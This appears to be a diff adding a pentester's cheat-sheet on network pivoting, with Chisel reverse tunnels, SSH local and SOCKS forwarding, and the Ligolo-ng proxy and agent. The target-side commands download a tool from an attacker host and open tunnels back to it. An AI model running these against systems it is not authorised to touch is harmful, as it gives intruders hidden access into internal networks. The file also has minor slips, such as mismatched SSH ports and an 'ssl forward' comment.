@@ -1,0 +1,63 @@
+steps.Tunnels
+
+
+
+Chisel Commands
+        
+            ./chisel server -p <chiselPort> --reverse                      #attacker
+            iwr -uri http://<attacker>/chisel.exe -Outfile chisel.exe                     #target
+            .\chisel.exe client <attacker>:<chiselPort> R:<fPort>:<target>:<fPort>               #target 
+        use proxychains to talk thru tunnel      
+            proxychains -q <command>  #attacker
+            
+
+SSH 
+
+Static port forwarding
+
+ssh -N -L 5432:127.0.0.1:5423 <remoteid>@<remoteIP>  # ssl forward
+
+
+Here's a breakdown of the command:
+
+    ssh: Initiates an SSH connection.
+    -N: Specifies that no command should be executed on the remote server.
+    -L 5432:127.0.0.1:5423: Sets up local port forwarding. Any traffic sent to the local port 5432 will be forwarded to the remote port 5423 on the remote server.
+    <remoteid>@<remoteIP>: Specifies the username and IP address (or domain) of the remote server 
+
+
+
+Dynamic port fprwarding 
+
+port will mattch socks5 is set to in that 
+ssh -D 1080 <remoteid>@<remoteIP>
+
+
+
+Here's a breakdown of the command:
+    ssh: Initiates an SSH connection.
+    -D <localPort>: Sets up dynamic port forwarding. The specified local port will act as a SOCKS proxy that forwards traffic through the SSH tunnel.
+    <remoteid>@<remoteIP>: Specifies the username and IP address (or domain) of the remote server you want to connect to.
+
+
+
+Ligolo-ng
+reference https://www.hackingarticles.in/a-detailed-guide-on-ligolo-ng/
+https://github.com/nicocha30/ligolo-ng/releases
+
+no need to use proxychains 
+
+
+attacker 
+
+    sudo ip tuntap add user $USER mode tun ligolo
+    sudo ip link set ligolo up
+    ./proxy -selfcert -laddr 0.0.0.0:443
+
+target
+
+    ./agent -connect <attackerIP>:443 -ignore-cert
+
+
+
+
